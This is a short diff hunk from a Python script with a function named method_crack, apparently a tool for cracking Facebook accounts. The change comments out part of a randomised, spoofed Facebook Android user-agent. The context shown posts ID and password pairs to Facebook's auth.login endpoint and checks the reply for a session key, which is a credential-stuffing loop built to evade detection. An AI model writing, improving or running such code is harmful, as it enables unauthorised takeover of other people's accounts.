@@ -121,7 +121,7 @@ def method_crack(ids,passlist):
              ##user_agen = f"{random.choice(dalvik_version)} (Linux; U; {random.choice(android_version)}; {random.choice(device_make)} Build/{random.randint(1, 999999)}.001) " \
              ##f"[FBAN/{random.choice(facebook_build)};{random.choice(app_version)};FBPN/com.facebook.katana;FBLC/{random.choice(locale)};" \
              ##f"FBBV/{random.randint(1, 999999)};FBCR/{random.choice(['AT&T', 'Verizon', 'T-Mobile'])};FBMF/{random.choice(device_make)};FBBD/{random.choice(device_make)};" \
-             f"FBDV/{random.choice(['Nokia0', 'Nokia1', 'Nokia2'])};FBSV/11;FBCA/{random.choice(processor_architecture)};FBDM/{{density={random_density:.2f},width={random_width},height={random_height}}};{random.choice(facebook_fw_version)};FBRV/{random.randint(1, 999999)}}]"
+             ##f"FBDV/{random.choice(['Nokia0', 'Nokia1', 'Nokia2'])};FBSV/11;FBCA/{random.choice(processor_architecture)};FBDM/{{density={random_density:.2f},width={random_width},height={random_height}}};{random.choice(facebook_fw_version)};FBRV/{random.randint(1, 999999)}}]"
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
